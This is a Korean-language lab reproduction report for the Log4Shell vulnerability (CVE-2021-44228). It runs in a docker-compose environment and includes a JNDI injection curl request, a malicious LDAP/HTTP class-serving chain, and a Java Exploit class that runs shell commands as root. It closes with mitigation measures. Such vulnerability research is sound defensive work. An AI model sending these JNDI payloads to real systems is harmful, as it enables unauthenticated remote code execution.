# CVE-2021-44228 (Log4Shell) - Apache Log4j2 원격 코드 실행 취약점

## 1. 취약점 요약

| 항목 | 내용 |
|---|---|
| CVE ID | CVE-2021-44228 |
| 대상 소프트웨어 | Apache Log4j2 |
| 취약 버전 | 2.0-beta9 ~ 2.14.1 |
| 패치 버전 | 2.15.0 이상 (실질적으로는 2.17.1 권장) |
| CVSS 3.1 점수 | 10.0 (Critical) |
| 인증 필요 여부 | 불필요 (Unauthenticated) |
| 공격 벡터 | Network (원격) |
| 영향 | 원격 코드 실행 (RCE) |

Log4j2는 로그 메시지에 `${jndi:...}` 형식의 문자열이 포함되면 **Lookup 기능**을 통해
JNDI(Java Naming and Directory Interface) 조회를 수행한다. 공격자가 제어하는 LDAP/RMI
서버 주소를 이 문자열에 삽입하면, 애플리케이션이 해당 서버가 지정한 원격 Java 클래스를
다운로드하여 실행하게 되며, 이는 곧 원격 코드 실행으로 이어진다.

## 2. 환경 구성

3개의 컨테이너로 구성되며 `docker-compose.yml` 하나로 전체 환경이 기동된다.

```
[클라이언트/공격자]
      │  ① HTTP 요청 (X-Api-Version: ${jndi:ldap://ldap-server:1389/Exploit})
      ▼
[vulnerable-app:8080]  ← log4j-core 2.14.1
      │  ② JNDI lookup 발생
      ▼
[ldap-server:1389]  ← marshalsec LDAPRefServer
      │  ③ 클래스 참조(Reference) 응답: http://http-server:8000/#Exploit
      ▼
[http-server:8000]  ← Exploit.class 서빙
      │  ④ 클래스 다운로드
      ▼
[vulnerable-app 컨테이너 내부에서 Exploit.class 실행 → RCE]
```

| 서비스 | 역할 | 포트 |
|---|---|---|
| vulnerable-app | log4j-core 2.14.1을 사용해 HTTP 헤더를 로깅하는 취약 대상 | 8080 |
| ldap-server | marshalsec 기반 악성 LDAP Reference 서버 | 1389 (내부) |
| http-server | 악성 Exploit.class를 서빙 | 8000 (내부) |

## 3. 취약 조건

- log4j-core 버전이 2.0-beta9 ~ 2.14.1 사이일 것
- 사용자 입력값이 검증 없이 log4j 로거로 전달될 것 (예: HTTP 헤더, 파라미터, User-Agent 등)
- `log4j2.formatMsgNoLookups` 옵션이 비활성화(기본값)일 것
- 애플리케이션 서버가 외부 네트워크로 LDAP/RMI 연결이 가능할 것

## 4. 재현 절차

### 4.1 환경 기동

```bash
docker compose build --no-cache
docker compose up -d
docker compose ps
```

세 컨테이너(`log4shell-vulnerable-app`, `log4shell-ldap-server`, `log4shell-http-server`)가
모두 `Up` 상태인지 확인한다.

### 4.2 정상 요청 확인

```bash
curl http://localhost:8080/
```

`OK` 응답과 함께 vulnerable-app 로그에 요청이 정상 기록되는지 확인한다.

```bash
docker logs log4shell-vulnerable-app
```

## 5. PoC 코드

### 5.1 공격 요청

```bash
curl -H 'X-Api-Version: ${jndi:ldap://ldap-server:1389/Exploit}' http://localhost:8080/
```

### 5.2 실행되는 악성 클래스 (`poc/Exploit.java`)

```java
public class Exploit {
    static {
        try {
            String[] cmd = {
                "/bin/sh", "-c",
                "echo 'PWNED-BY-CVE-2021-44228' > /tmp/pwned_by_log4shell.txt; id >> /tmp/pwned_by_log4shell.txt; date >> /tmp/pwned_by_log4shell.txt"
            };
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

static 블록은 클래스가 JVM에 로드되는 시점에 자동 실행되므로, 별도의 인스턴스화 없이도
임의 명령이 실행된다. 실제 침해 시나리오에서는 리버스 쉘 연결 등으로 대체 가능하나,
본 PoC는 안전성을 위해 파일 생성으로 RCE 여부만 증명한다.

## 6. 실행 결과

공격 요청 전송 후, vulnerable-app 컨테이너 내부에서 RCE 증거 파일이 생성되었는지 확인한다.

```bash
docker exec log4shell-vulnerable-app cat /tmp/pwned_by_log4shell.txt
```

**예상 출력:**
```
PWNED-BY-CVE-2021-44228
uid=0(root) gid=0(root) groups=0(root)
<현재 시각>
```

![공격 요청 및 결과](screenshots/1.png)
![RCE 증거 파일 확인](screenshots/2.png)

> 스크린샷은 실제 실행 후 캡처하여 `screenshots/` 폴더에 로컬 파일로 저장 후 교체할 것.

## 7. 대응 방안

| 방안 | 설명 |
|---|---|
| 버전 업그레이드 | log4j-core를 2.17.1 이상으로 업그레이드 |
| 설정 완화 | `log4j2.formatMsgNoLookups=true` 시스템 프로퍼티 설정 (2.10~2.14.1 한정 임시 대응) |
| 클래스 제거 | 2.10 이상에서 `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`로 JNDI 조회 클래스 제거 |
| 네트워크 통제 | 애플리케이션 서버의 아웃바운드 LDAP/RMI(389, 1099, 1389 등) 연결을 방화벽에서 차단 |
| WAF 룰 | `${jndi:` 패턴을 포함한 요청 헤더/파라미터 차단 (우회 패턴 다수 존재하므로 근본 대책은 아님) |
| 모니터링 | 아웃바운드 LDAP/RMI 연결 시도를 IoC로 탐지 (SIEM/EDR 연동) |
